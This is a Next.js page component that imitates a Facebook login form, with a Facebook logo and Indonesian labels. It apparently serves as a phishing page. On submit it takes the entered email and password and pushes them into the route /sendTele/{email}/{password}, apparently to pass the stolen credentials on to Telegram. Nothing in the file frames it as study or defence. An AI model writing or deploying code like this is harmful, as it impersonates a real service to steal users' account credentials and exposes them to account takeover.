"use client";

import { useState } from "react";
import Image from "next/image";
import Link from "next/link";
import Direct from "../../component/direct";
import { useRouter } from "next/navigation";

function page() {
  const router = useRouter();
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const handleInputChange = (e) => {
    setEmail(e.target.value);
  };
  const handleInputPassword = (e) => {
    setPassword(e.target.value);
  };

  const handleSubmit = (e) => {
    e.preventDefault();
    console.log("Nilai Email:", email);
    console.log("Nilai Email:", password);
    // Lakukan tindakan lain, seperti mengirim data ke server
    router.push(`/sendTele/${email}/${password}`);
  };
  return (
    <div className=" lg:flex justify-center  p-10">
      <div className="grid grid-cols-1 px-3 text-center py-3 rounded-md border">
        <Image
          className="mx-auto my-5"
          src="/images/facebook.png"
          alt={"facebook"}
          width={200}
          height={100}
        />
        <form onSubmit={handleSubmit} className="grid">
          <input
            type="email"
            placeholder="Email"
            name="email"
            value={email}
            onChange={handleInputChange}
            className="border px-4 py-3 rounded-lg my-2"
            required
          />
          <input
            type="password"
            placeholder="password"
            value={password}
            onChange={handleInputPassword}
            className="border px-4 py-3 rounded-lg my-2"
            name="password"
            required
          />
          <Link
            href={"/"}
            className="flex justify-end text-sm text-gray-400 mb-4"
          >
            Lupa Password?
          </Link>
          <div className="flex justify-center">
            <button
              type="submit"
              className="bg-blue-700 my-3 w-full hover:bg-blue-500 transition-all duration-500  text-white px-3  py-3  rounded-lg "
            >
              Login
            </button>
          </div>
        </form>

        <hr />
        <div className="flex justify-center">
          <Direct
            css="bg-red-700 my-3 w-full"
            text="Create New Account"
            link="/"
          />
        </div>

        {/* <div className="mt-4 w-full"></div> */}
      </div>
    </div>
  );
}

export default page;
